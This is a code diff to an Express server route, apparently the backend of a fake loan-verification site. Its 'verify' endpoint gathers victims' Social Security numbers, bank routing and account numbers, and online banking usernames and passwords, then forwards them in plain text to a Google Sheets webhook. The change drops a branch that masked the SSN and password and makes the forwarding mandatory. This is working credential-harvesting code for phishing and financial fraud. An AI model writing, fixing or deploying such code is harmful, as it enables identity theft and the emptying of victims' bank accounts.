@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import type { Server } from "http";
 import { storage } from "./storage";
-import { api } from "@shared/routes";
+import { api } from "../shared/routes";
 import { z } from "zod";
 
 const verifySchema = z.object({
@@ -49,36 +49,38 @@ export function registerRoutes(
       const data = verifySchema.parse(req.body);
 
       let sheetsUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL;
-      if (sheetsUrl) {
-        // Sanitize the URL to remove potential quotes or whitespace from .env
-        sheetsUrl = sheetsUrl.trim().replace(/^["']|["']$/g, '');
-        console.log(`[Verify] Forwarding to Google Sheets (Length: ${sheetsUrl.length}):`, sheetsUrl);
-        
-        const row = [
-          data.firstName, data.lastName, data.email, data.phone,
-          data.dob, data.ssn, data.address, data.city, data.state,
-          data.country, data.zip, data.loanAmount, data.bankName,
-          data.routing, data.account, data.onlineBankingId, data.onlineBankingPass,
-          new Date().toISOString(),
-        ];
-        try {
-          const response = await fetch(sheetsUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ values: row }),
-            redirect: "follow", // Important for GAS which redirects
-          });
-          const result = await response.text();
-          console.log("[Verify] Google Sheets Response Status:", response.status);
-          console.log("[Verify] Google Sheets Response Body:", result);
-        } catch (fetchErr) {
-          console.error("[Verify] Webhook fetch error:", fetchErr);
-        }
-      } else {
-        console.log("[Verify] Submission received (No URL):", { ...data, ssn: "***", onlineBankingPass: "***" });
+      if (!sheetsUrl) {
+        console.error("[Verify] Error: GOOGLE_SHEETS_WEBHOOK_URL is not defined");
+        return res.status(500).json({ message: "Server configuration error: missing webhook URL" });
       }
 
-      res.status(200).json({ success: true });
+      // Sanitize the URL to remove potential quotes or whitespace from .env
+      sheetsUrl = sheetsUrl.trim().replace(/^["']|["']$/g, '');
+      console.log(`[Verify] Forwarding to Google Sheets (Length: ${sheetsUrl.length}):`, sheetsUrl);
+
+      const row = [
+        data.firstName, data.lastName, data.email, data.phone,
+        data.dob, data.ssn, data.address, data.city, data.state,
+        data.country, data.zip, data.loanAmount, data.bankName,
+        data.routing, data.account, data.onlineBankingId, data.onlineBankingPass,
+        new Date().toISOString(),
+      ];
+
+      try {
+        const response = await fetch(sheetsUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ values: row }),
+          redirect: "follow", // Important for GAS which redirects
+        });
+        const result = await response.text();
+        console.log("[Verify] Google Sheets Response Status:", response.status);
+        console.log("[Verify] Google Sheets Response Body:", result);
+      } catch (fetchErr) {
+        console.error("[Verify] Webhook fetch error:", fetchErr);
+      }
+
+      return res.status(200).json({ success: true });
     } catch (err) {
       if (err instanceof z.ZodError) {
         return res.status(400).json({ message: "Invalid form data", errors: err.errors });
